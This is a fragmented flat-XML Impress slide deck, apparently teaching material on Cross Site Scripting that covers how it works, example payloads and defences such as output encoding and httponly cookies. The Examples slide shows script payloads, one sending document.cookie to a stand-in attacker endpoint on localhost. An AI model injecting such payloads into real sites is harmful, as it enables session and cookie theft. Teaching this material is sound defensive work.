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cc9900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cc9900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71cm" svg:stroke-color="#3b812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secondImpress-notes">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="12.262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simple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loext:graphic-properties draw:fill-color="#ffffff"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" fo:line-height="100%" fo:text-align="center" style:writing-mode="lr-tb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start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line-height="100%" fo:text-align="start" style:punctuation-wrap="simple" style:writing-mode="lr-tb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cc9900" fo:font-size="6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ross Site Scripting</presentation:footer-decl>
      <draw:page draw:name="page1" draw:style-name="dp1" draw:master-page-name="secondImpress" presentation:presentation-page-layout-name="AL1T0" presentation:use-footer-name="ftr1"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Cross Site Scripting</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Subtitle 5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frame draw:name="Rectangle 7" presentation:style-name="pr3" draw:text-style-name="P5" draw:layer="layout" svg:width="7.972cm" svg:height="1.362cm" svg:x="10.425cm" svg:y="25.889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4" draw:text-style-name="P6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Cross Site Scripting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7"><text:span text:style-name="T3">Cross Site Scripting</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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4">User data in cookies relevant to a (vulnerable) Web Application is disclosed to a malicious third party. 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ross Site Scripting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7"><text:span text:style-name="T3">Cross Site Scripting</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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4">Can happen when a Web Application echos user input to a page. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">The user can then enter script code (Javascript) which gets executed by the browser.</text:span></text:p>
              </text:list-item>
            </text:list>
            <text:p text:style-name="P9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3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ross Site Scripting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7"><text:span text:style-name="T3">Cross Site Scripting</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:custom-shape draw:name="Rectangle 3" draw:style-name="gr2" draw:text-style-name="P13" draw:layer="layout" svg:width="4.762cm" svg:height="3.174cm" svg:x="16.669cm" svg:y="5.755cm">
          <text:p text:style-name="P12"><text:span text:style-name="T5">V</text:span><text:span text:style-name="T5">u</text:span><text:span text:style-name="T5">l</text:span><text:span text:style-name="T5">n</text:span><text:span text:style-name="T5">e</text:span><text:span text:style-name="T5">r</text:span><text:span text:style-name="T5">a</text:span><text:span text:style-name="T5">b</text:span><text:span text:style-name="T5">l</text:span><text:span text:style-name="T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3" draw:layer="layout" svg:width="4.762cm" svg:height="3.174cm" svg:x="16.272cm" svg:y="11.906cm">
          <text:p text:style-name="P12"><text:span text:style-name="T5">A</text:span><text:span text:style-name="T5">t</text:span><text:span text:style-name="T5">t</text:span><text:span text:style-name="T5">a</text:span><text:span text:style-name="T5">c</text:span><text:span text:style-name="T5">k</text:span><text:span text:style-name="T5">e</text:span><text:span text:style-name="T5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13" draw:layer="layout" svg:width="4.762cm" svg:height="3.174cm" svg:x="5.358cm" svg:y="8.533cm">
          <text:p text:style-name="P12"><text:span text:style-name="T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3" draw:text-style-name="P14" draw:layer="layout" svg:width="5.952cm" svg:height="1.388cm" svg:x="10.319cm" svg:y="6.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3" draw:text-style-name="P14" draw:layer="layout" svg:width="5.357cm" svg:height="1.19cm" draw:transform="rotate (-3.14159265358979) translate (16.073cm 9.32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6" draw:style-name="gr3" draw:text-style-name="P14" draw:layer="layout" svg:width="5.357cm" svg:height="1.983cm" svg:x="10.517cm" svg:y="11.1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8" draw:style-name="gr4" draw:text-style-name="P13" draw:layer="layout" svg:width="0.854cm" svg:height="1.013cm" svg:x="9.334cm" svg:y="14.288cm">
          <text:p text:style-name="P15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13" draw:layer="layout" svg:width="0.854cm" svg:height="1.013cm" svg:x="14.493cm" svg:y="8.731cm">
          <text:p text:style-name="P15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13" draw:layer="layout" svg:width="0.854cm" svg:height="1.013cm" svg:x="12.509cm" svg:y="5.755cm">
          <text:p text:style-name="P15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13" draw:layer="layout" svg:width="0.854cm" svg:height="1.013cm" svg:x="13.898cm" svg:y="11.113cm">
          <text:p text:style-name="P15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16" draw:layer="layout" svg:x1="8.4cm" svg:y1="15.6cm" svg:x2="7.8cm" svg:y2="12.2cm">
          <text:p/>
        </draw:line>
        <presentation:notes draw:style-name="dp4">
          <draw:page-thumbnail draw:style-name="gr1" draw:layer="layout" svg:width="13.008cm" svg:height="10.218cm" svg:x="2.693cm" svg:y="2.07cm" draw:page-number="4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ross Site Scripting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7"><text:span text:style-name="T3">Cross Site Scripting</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10" draw:layer="layout" svg:width="22.859cm" svg:height="12.584cm" svg:x="1.27cm" svg:y="4.445cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L5">
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">URL delivered to client.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Contains a link to a vulnerable Web Application. Link pressed. Client sends request for this URL</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Vulnerable Web site echos user data (in URL) on browser.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Javascript code incorporated into the URL is executed and sends request to the Attacker Application, (including Cookie/Session info.)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5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xamples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7"><text:span text:style-name="T3">Examples</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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4">&lt;script&gt;alert("Dangerous")&lt;/script&gt;</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">&lt;script&gt;document.location.replace('http://localhost:8090/attacker');&lt;/script&gt;</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">&lt;script&gt;document.location.replace('http://localhost:8090/attacker/hack/printPasswordInfo?c='+document.cookie);&lt;/script&gt;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6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an do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7"><text:span text:style-name="T3">Can do</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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4">A Cross Site Scripting attack can access cookies. </text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Can access the DOM model and change links.</text:span></text:p>
              </text:list-item>
            </text:list>
            <text:list text:style-name="L6">
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Can be delayed - data can be stored in a database for example and echo’ed at a later time. </text:span>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7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problem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7"><text:span text:style-name="T3">The problem</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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4">Web Application accepts user input</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Does not check it.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Echos the user input directly to the browser.</text:span></text:p>
              </text:list-item>
            </text:list>
            <text:p text:style-name="P9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8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The solution" draw:style-name="dp3" draw:master-page-name="secondImpress" presentation:presentation-page-layout-name="AL2T11" presentation:use-footer-name="ftr1">
        <draw:frame draw:name="Title 1" presentation:style-name="pr5" draw:text-style-name="P8" draw:layer="layout" svg:width="22.859cm" svg:height="3.165cm" svg:x="1.27cm" svg:y="0.772cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P7"><text:span text:style-name="T3">The solution</text:span></text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:name="Content Placeholder 2" presentation:style-name="pr6" draw:text-style-name="P10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 text:style-name="P9"><text:span text:style-name="T4">Check user input using regular expressions</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">URL encode the output. </text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p text:style-name="P17"><text:span text:style-name="T4">prevents text being interpreted as html/Javascript</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p text:style-name="P9"><text:span text:style-name="T4">Add the httponly option to cookies</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p text:style-name="P17"><text:span text:style-name="T4">Cookie can’t be accessed in Javascrip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9" presentation:class="page"/>
          <draw:frame presentation:style-name="pr7" draw:text-style-name="P11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Jacob</meta:initial-creator>
    <dc:creator>Paul Jacob</dc:creator>
    <meta:editing-cycles>87</meta:editing-cycles>
    <meta:print-date>2000-10-03T11:11:38</meta:print-date>
    <meta:creation-date>2000-05-11T18:21:41</meta:creation-date>
    <dc:date>2019-03-22T08:57:26.294738099</dc:date>
    <meta:editing-duration>PT29M11S</meta:editing-duration>
    <meta:generator>LibreOffice/6.0.7.3$Linux_X86_64 LibreOffice_project/00m0$Build-3</meta:generator>
    <meta:document-statistic meta:object-count="68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ul" xlink:href=""/>
  </office:meta>
</office:document-meta>
</file>